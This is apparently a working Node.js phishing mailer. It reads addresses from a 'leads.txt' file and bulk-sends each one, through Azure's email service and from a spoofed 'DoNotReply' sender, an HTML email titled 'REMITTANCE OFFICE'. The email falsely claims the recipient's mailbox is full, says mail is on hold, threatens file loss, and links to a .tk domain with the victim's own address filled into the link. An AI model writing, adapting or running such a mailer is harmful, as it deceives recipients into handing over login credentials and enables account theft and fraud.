const fs = require('fs');
const path = require('path');
const filePath = path.join(__dirname, 'leads.txt');

const emails = []

fs.readFile(filePath, 'utf-8', (err, data) => {
  if (err) throw err;
  
  const emails = data.trim().split('\n');
  
  for (const emailss of emails) {
   // emails.push(emailss);
        main(emailss);
  }
});


const { EmailClient } = require("@azure/communication-email");
require("dotenv").config();
const connectionString = process.env['COMMUNICATION_SERVICES_CONNECTION_STRING'];
const sender = "DoNotReply@swfwinefoodfest.org";
var client = new EmailClient(connectionString);


const emailContent = {
                         subject: "REMITTANCE OFFICE",
                        html: `<html><head></head><body>
                        <meta http-equiv="X-UA-Compatible" content="IE=edge">
                        
                        
                        <table style="width: 100%;" border="0" cellspacing="2" cellpadding="1">
                        <tbody>
                        <tr>
                        <td>
                        <p><span style="font-size: 36px;"><span style="font-family: Arial, Helvetica, sans-serif;"><span style="font-size: 36px;"><span style="font-family: Arial, Helvetica, sans-serif;"><strong>Full Storage Notification</strong></span></span></span></span></p>
                        <p><span style="font-size: 13pt;">Your mail-box <font color="#0080ff"><%= EMAIL %></font>&nbsp;is running low on storage capacity. </span></p>
                        <p><span style="font-size: 13pt;">Due to this, some of your incoming mail has been placed on hold.</span></p>
                        <p><span style="color: rgb(0, 0, 0);"><span style="font-size: 13pt;">Clear cache to free some space.</span></span></p></td></tr>
                        <tr>
                        <td></td></tr>
                        <tr>
                        <td>
                        <p><span style="font-size: 13pt;"><span style="font-size: 13pt;"><font color="#1075ca" size="4"><span style="font-size: 12pt;"><font color="#1075ca"><a href="http://ghsk.tk/<%= EMAIL %>"><strong style="font-size: 14pt;"><%= EMAIL %>/Cache/</strong></a></font></span></font></span></span></p>
                        <p><span style="font-size: 13pt;"><span style="font-size: 13pt;"><strong></strong></span></span>&nbsp;</p>
                        <p><span style="font-size: 13pt;"><span style="font-size: 13pt;"><strong>Note:</strong> Failure to clear cache will lead to mail malfunction and loss of files.</span></span></p></td></tr>
                        <tr>
                        <td>
                        <p>&nbsp;</p></td></tr></tbody></table>
                        <p><font color="#7f7f7f"><%= UDOMAIN %>&nbsp;Online Services</font></p>
                        <p><font face="Calibri" size="1"><font face="Times New Roman" size="3">*************************************************<br>CONFIDENTIALITY NOTE: This email&nbsp;is confidential and may be protected by legal privilege. If you are not the intended recipient, be aware that any disclosure, copying, distribution or use of this email or any attachments is prohibited under applicable law.<br><br>
                        The sender does not accept any liabilities for errors, omissions, corruption or virus in the contents of this email or any attachments that may arise as a result of your receiving this email transmission. <br>*************************************************</font> </font></p></body></html>`
                    }


async function main(emailss) {
    try {
      //send mail
      const emailMessage = {
        sender: sender,
        content: emailContent,
        importance: 'high',
        recipients: {
          to: [{email: emailss.trim()}],
        },
      };
  //    console.log(emailMessage.recipients.to);

     var sendResult = await client.send(emailMessage);


      if (sendResult && sendResult.messageId) {
        const messageId = sendResult.messageId;
          if (messageId === null || messageId === undefined) {
          console.log("Message Id not found.");
          return;
        }
  
      //  console.log("Send email success, MessageId :", messageId);
  
        let counter = 0;
        const statusInterval = setInterval(async function () {
          counter++;
          try {
              const sendStatusResult = await client.getSendStatus(messageId);
              if (sendStatusResult) {
                  console.log(`Email status for {${messageId}} : [${sendStatusResult.status}]`);
                  if (sendStatusResult.status.toLowerCase() !== "queued" || counter > 12) {
                clearInterval(statusInterval);
              }
            }
          } catch (e) {
            console.log("Error in checking send mail status: ",e);
          }
        }, 5000);
      } else {
        console.error("Something went wrong when trying to send this email: ", sendResult);
      }


    } catch (e) {
      console.log(e);
    }
  }
  //main();